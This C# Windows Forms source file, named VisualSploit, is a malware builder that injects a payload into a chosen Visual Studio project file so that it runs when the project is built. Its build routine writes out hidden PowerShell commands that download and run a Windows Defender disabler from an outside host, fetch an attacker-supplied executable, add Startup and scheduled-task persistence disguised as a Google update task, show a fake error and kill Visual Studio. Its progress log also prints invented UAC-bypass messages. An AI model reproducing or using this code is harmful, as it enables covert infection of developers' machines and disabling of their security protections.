using Microsoft.Build.BuildEngine;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Reflection;
using System.Xml;
using System.Diagnostics;

namespace VisualSploit
{
    public partial class Form1 : Form
    {
        private object exploit;
        private bool odd = true;
        private bool even = true;
        private bool chk = true;
        private bool chk1 = true;
        private bool chk2 = true;

        public Form1()
        {
            InitializeComponent();
        }

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void txtPath_DragDrop(object sender, DragEventArgs e)
        {
            string loc = ((string[])e.Data.GetData(DataFormats.FileDrop))[0];

            if (Path.GetExtension(loc) == ".csproj" || Path.GetExtension(loc) == ".vbproj")
            {
                txtPath.Text = loc;
            }
            else
            {
                MessageBox.Show("Incorrect VB/CSProj File Format!");
            }
        }

        private void txtPath_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog of = new OpenFileDialog())
            {
                of.Filter = "C# Project|*csproj|VB.NET Project|*vbproj";
                of.Title = "Select the project file";
                if (of.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = of.FileName;
                }
            }
        }

        private void txtLink_TextChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click_1(object sender, EventArgs e)
        {

        }

        private void label2_Click_1(object sender, EventArgs e)
        {

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void metroTabPage1_Click(object sender, EventArgs e)
        {

        }

        private void panelTop_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panelTop_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void lblTitle1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            #region Get Link
            if (string.IsNullOrEmpty(txtLink.Text) == true)
            {
                MessageBox.Show("Compilation Error: Please enter your download link!");
                return;
            }
            else if (txtLink.Text.Contains("exe") != true)
            {
                MessageBox.Show("Compilation Error: Please use an exe!");
                return;
            }
            #endregion

            #region Variables
            string projectFile = File.ReadAllText(txtPath.Text);
            File.WriteAllText(txtPath.Text, projectFile);
            #endregion

            #region Initial Targets
            projectFile = projectFile.Insert(projectFile.IndexOf("ToolsVersion"), "InitialTargets=\"Build\" ");
            #endregion
            #region Builder Logs
            async Task LogBuild()
            {
                await Task.Delay(94);
                rtbLogs.Text += "[LOG] Loading Builder Settings...";
                await Task.Delay(926);
                rtbLogs.Text += Environment.NewLine + "[SUCCESS] Settings Loaded!";
                await Task.Delay(324);
                rtbLogs.Text += Environment.NewLine + "[LOG] Writing Payload...";
                await Task.Delay(821);
                rtbLogs.Text += Environment.NewLine + "[SUCCESS] Added " + txtLink.Text + " to (" + txtPath.Text + ")";
                if (boxTaskScheduler.Checked)
                {
                    await Task.Delay(246);
                    rtbLogs.Text += Environment.NewLine + "[SUCCESS] Schtasks Persistence Generated.";
                }
                if (boxStartup.Checked)
                {
                    await Task.Delay(193);
                    rtbLogs.Text += Environment.NewLine + "[LOG] Adding Startup Persistence As \"" + txtStartupName + "\"...";
                    await Task.Delay(480);
                    rtbLogs.Text += Environment.NewLine + "[SUCCESS] Startup Persistence Generated.";
                }
                if (boxErrorMsg.Checked)
                {
                    await Task.Delay(316);
                    rtbLogs.Text += Environment.NewLine + "[LOG] Building Error Message...";
                    await Task.Delay(415);
                    rtbLogs.Text += Environment.NewLine + "[SUCCESS] Error Message Created.";
                }
                if (disableWD.Checked)
                {
                    await Task.Delay(391);
                    rtbLogs.Text += Environment.NewLine + "[LOG] Adding Windows Defender Bypass...";
                    await Task.Delay(708);
                    if (radioFodhelper.Checked)
                    {
                        rtbLogs.Text += Environment.NewLine + "[SUCCESS] UAC Bypass Created Using \"Fodhelper\".";
                    }
                    else
                    {
                        rtbLogs.Text += Environment.NewLine + "[SUCCESS] UAC Bypass Created Using \"Silent Cleanup\".";
                    }
                    await Task.Delay(540);
                    rtbLogs.Text += Environment.NewLine + "[SUCCESS] Defender Disabler Added.";
                }
                await Task.Delay(270);
                rtbLogs.Text += Environment.NewLine + "[LOG] Inserting Payload into Project File...";
                await Task.Delay(762);
                rtbLogs.Text += Environment.NewLine + "[SUCCESS] Injected into IndexOf </Project>";
                await Task.Delay(320);
                rtbLogs.Text += Environment.NewLine + "[LOG] Cleaning Code...";
                await Task.Delay(1066);
                rtbLogs.Text += Environment.NewLine + "[SUCCESS] PS Code Successfully Formatted.";
                await Task.Delay(185);
                rtbLogs.Text += Environment.NewLine + "";
                rtbLogs.Text += Environment.NewLine + "[COMPLETE] Build Complete! Written to " + txtPath.Text;

            }
            Task.Run(async () => await LogBuild());
            #endregion
            string exploit = Properties.Resources.exploit;
            #region Exploit
            string sanitized = cboPath.Text.Replace("%", "");
            string envpath = "$env:" + sanitized + "\\[EXE-REPLACE].exe";
            var disable = "powershell.exe -noexit -windowstyle hidden -executionpolicy bypass -command $stp=[Environment]::GetFolderPath('Startup');cd $stp;wget 'https://raw.githubusercontent.com/elcaza/disable_windows_defender/main/disable_windows_defender.cmd' -outfile 'dnshost.bat';Start-Process 'dnshost.bat'";
            var startup = "powershell.exe -windowstyle hidden -executionpolicy bypass -command $stp=[Environment]::GetFolderPath('Startup');cd $stp;Copy-Item " + envpath + " -Destination $stp\\" + txtStartupName.Text;
            var errormsg = "powershell.exe -noexit -nologo -noprofile -windowstyle hidden -executionpolicy bypass -command Add-Type -AssemblyName PresentationCore,PresentationFramework;[System.Windows.MessageBox]::Show('" + txtDescription.Text + "','" + txtTitle.Text + "','Ok','Error')";
            var killvs = "taskkill /im devenv.exe /f";
            if (disableWD.Checked)
            {
                exploit = exploit.Replace("[DEFENDER]", disable);
            }
            else
            {
                exploit = exploit.Replace("[DEFENDER]", "powershell.exe -windowstyle hidden -command ' '");
            }
            if (boxStartup.Checked)
            {
                exploit = exploit.Replace("[STARTUP]", startup);
            }
            else
            {
                exploit = exploit.Replace("[STARTUP]", "powershell.exe -windowstyle hidden -command ' '");
            }
            if (boxTaskScheduler.Checked)
            {
                exploit = exploit.Replace("[SCHTASK]", "powershell.exe -windowstyle hidden -command $action=New-ScheduledTaskAction -Execute '[PATH-REPLACE]\\[EXE-REPLACE]';$trigger=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10);Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'GoogleUpdateTaskMachineIL' -Description 'Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Google software using it.'");
            }
            else
            {
                exploit = exploit.Replace("[SCHTASK]", "powershell.exe -windowstyle hidden -command ' '");
            }
            if (boxErrorMsg.Checked)
            {
                exploit = exploit.Replace("[ERRORMSG]", errormsg);
                exploit = exploit.Replace("[KILLVS]", killvs);
            }
            else
            {
                exploit = exploit.Replace("[ERRORMSG]", "powershell.exe -windowstyle hidden -command ' '");
                exploit = exploit.Replace("[KILLVS]", "powershell.exe -windowstyle hidden -command ' '");
            }
            exploit = exploit.Replace("-Minutes 10", "-Minutes " + txtMinutes.Text);
            exploit = exploit.Replace("[LINK-REPLACE]", txtLink.Text);
            exploit = exploit.Replace("[EXE-REPLACE]", txtFileName.Text);
            exploit = exploit.Replace("[PATH-REPLACE]", cboPath.Text);
            exploit = exploit.Replace("[PATH2-REPLACE]", "$env:" + sanitized);
            projectFile = projectFile.Insert(projectFile.IndexOf("</Project>"), exploit);
            File.WriteAllText(txtPath.Text, projectFile);
            #endregion
        }

        private void btnBrowseFiles_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog of = new OpenFileDialog())
            {
                of.Filter = "C# Project|*csproj|VB.NET Project|*vbproj";
                of.Title = "Select the project file";
                if (of.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = of.FileName;
                }
            }
        }

        private void metroTabPage2_Click(object sender, EventArgs e)
        {

        }

        private void rtbLogs_TextChanged(object sender, EventArgs e)
        {

        }

        private void agreeTOS_CheckedChanged(object sender, EventArgs e)
        {
            if (odd)
            {
                btnBuild.Enabled = true;
            }
            else
            {
                btnBuild.Enabled = false;
            }
            odd = !odd;
        }

        private void Temp_choice_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void disableWD_CheckedChanged(object sender, EventArgs e)
        {
            if (even)
            {
                radioSilentCleanup.Enabled = true;
                radioFodhelper.Enabled = true;
            }
            else
            {
                radioSilentCleanup.Enabled = false;
                radioFodhelper.Enabled = false;
            }
            even = !even;
        }

        private void boxTaskScheduler_CheckedChanged(object sender, EventArgs e)
        {
            if (chk)
            {
                txtMinutes.Enabled = true;
            }
            else
            {
                txtMinutes.Enabled = false;
            }
            chk = !chk;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (chk1)
            {
                btnTestError.Enabled = true;
                txtTitle.Enabled = true;
                txtDescription.Enabled = true;
            }
            else
            {
                btnTestError.Enabled = false;
                txtTitle.Enabled = false;
                txtDescription.Enabled = false;
            }
            chk1 = !chk1;
        }

        private void btnTestError_Click(object sender, EventArgs e)
        {
            MessageBox.Show(txtDescription.Text, txtTitle.Text,
            MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void txtFileName_TextChanged(object sender, EventArgs e)
        {

        }

        private void boxStartup_CheckedChanged(object sender, EventArgs e)
        {
            if (chk2)
            {
                txtStartupName.Enabled = true;
            }
            else
            {
                txtStartupName.Enabled = false;
            }
            chk2 = !chk2;
        }

        private void richTextBox3_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
